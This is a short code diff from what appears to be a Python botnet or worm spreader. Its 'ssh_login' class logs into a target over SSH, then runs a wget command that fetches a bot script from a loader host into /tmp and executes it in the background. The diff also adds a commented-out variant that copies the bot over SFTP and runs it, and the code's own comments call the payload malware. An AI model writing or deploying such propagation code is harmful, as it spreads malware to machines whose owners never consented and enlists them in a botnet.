@@ -162,6 +162,14 @@ class ssh_login(Thread):
 
         try:
             s.connect(self._ip, 22, self._uname, self._pwd, timeout=5, auth_timeout=5)
+
+            """
+            # Copy malware locally and execute.
+            sftp = paramiko.SFTPClient.from_transport(s)
+            sftp.put('/tmp/bot.py', '/tmp/bot.py')
+            stdin, stdout, stderr = s.exec_command("python3 /tmp/bot.py &")
+            """
+
             # Download malware from loader and execute.
             cmd = "wget -O /tmp/bot.py {}:{}/bot_multitry.py;python3 /tmp/bot.py {} {} &touch /tmp/done;".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
             sin, sout, serr = s.exec_command(cmd)
